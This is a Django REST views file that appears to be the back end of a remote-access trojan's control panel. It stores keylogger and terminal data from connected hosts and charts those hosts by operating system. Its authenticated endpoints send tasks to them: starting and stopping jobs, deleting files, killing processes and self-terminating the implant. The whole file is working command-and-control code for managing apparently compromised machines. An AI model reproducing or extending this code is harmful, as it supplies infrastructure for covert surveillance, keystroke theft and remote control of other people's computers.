from asgiref.sync import async_to_sync
from .consumers import HostConnectionConsumer
from rest_framework.response import Response
from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from .models import Host, HostConnection, TerminalData, KeyloggerData
from datetime import timedelta
from django.utils import timezone
from .serializers import HostSerializer, TerminalDataSerializer, KeyloggerDataSerializer
import json

# Create your views here.
def __get_hosts_count():
    COUNT_PAST_7_DAYS = []
    now = timezone.now()
    for i in range(7):
        start_date = (now - timedelta(days=i)).replace(hour=0, minute=0, second=0, microsecond=0)
        end_date = (now - timedelta(days=i)).replace(hour=23, minute=59, second=59, microsecond=999999)
        hosts = HostConnection.objects.filter(connected_at__range=[start_date, end_date]).all()

        __win = 0
        __mac = 0
        __lin = 0

        for item in hosts:
            if "windows" in (item.os).lower():
                __win += 1
            elif "linux" in (item.os).lower():
                __lin += 1
            elif "mac" in (item.os).lower():
                __mac += 1
                
        COUNT_PAST_7_DAYS.append({
            "date": start_date.strftime("%d/%m"),
            "win": __win,
            "mac": __mac,
            "lin": __lin
        })
    return COUNT_PAST_7_DAYS


@api_view(['GET'])
@permission_classes([IsAuthenticated])
def get_dashboard_data(request):
    context = {}
    try:
        context['hosts'] = [{'port' : item['host'], **item['hostvitals']} for item in HostConnectionConsumer.get_connected_hosts()]
    except Exception as e:
        pass
    
    context['connections'] = __get_hosts_count()
    
    try:
        host_data = Host.objects.all().order_by('-connected_at')
        serializer = HostSerializer(host_data, many=True)
        context['host_data'] = serializer.data
    except Exception as e:
        pass

    return Response(context)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def start_socket_task(request):
    data = request.data
    try:
        command = data['command']
    except KeyError:
        command = None
    connected_hosts = HostConnectionConsumer.get_connected_hosts()
    for item in connected_hosts:
        if str(data['id']) == str(item['hostvitals']['identifier']):
            async_to_sync(HostConnectionConsumer.send_message)(
                item['obj'],
                {
                    "type": "send_message",
                    "message": data['task'],
                    "command": command
                },
            )
    return Response(status=status.HTTP_200_OK)



@api_view(['POST'])
@permission_classes([IsAuthenticated])
def stop_socket_task(request):
    data = request.data
    try:
        command = data['command']
    except KeyError:
        command = None
    connected_hosts = HostConnectionConsumer.get_connected_hosts()
    for item in connected_hosts:
        if str(data['id']) == str(item['hostvitals']['identifier']):
            async_to_sync(HostConnectionConsumer.send_message)(
                item['obj'],
                {
                    "type": "send_message",
                    "message": data['task'],
                    "command": command
                },
            )
    return Response(status=status.HTTP_200_OK)



@api_view(['POST'])
@permission_classes([IsAuthenticated])
def remove_file(request):
    data = request.data
    if data['command']:
        connected_hosts = HostConnectionConsumer.get_connected_hosts()
        for item in connected_hosts:
            if str(data['id']) == str(item['hostvitals']['identifier']):
                async_to_sync(HostConnectionConsumer.send_message)(
                    item['obj'],
                    {
                        "type": "send_message",
                        "message": "remove_file",
                        "command": data['command']
                    },
                )
        return Response(status=status.HTTP_200_OK)
    else:
        return Response(status=status.HTTP_400_BAD_REQUEST)




@api_view(['POST'])
@permission_classes([IsAuthenticated])
def terminate_process(request):
    data = request.data
    try:
        command = data['command']
    except KeyError:
        command = None
    connected_hosts = HostConnectionConsumer.get_connected_hosts()
    for item in connected_hosts:
        if str(data['id']) == str(item['hostvitals']['identifier']):
            async_to_sync(HostConnectionConsumer.send_message)(
                item['obj'],
                {
                    "type": "send_message",
                    "message": "terminate_process",
                    "command": command
                },
            )
    return Response(status=status.HTTP_200_OK)




@api_view(['POST'])
@permission_classes([IsAuthenticated])
def self_terminate(request):
    data = request.data
    try:
        command = data['command']
    except KeyError:
        command = None
    connected_hosts = HostConnectionConsumer.get_connected_hosts()
    for item in connected_hosts:
        if str(data['id']) == str(item['hostvitals']['identifier']):
            async_to_sync(HostConnectionConsumer.send_message)(
                item['obj'],
                {
                    "type": "send_message",
                    "message": "self_terminate",
                    "command": command
                },
            )
    return Response(data['id'])

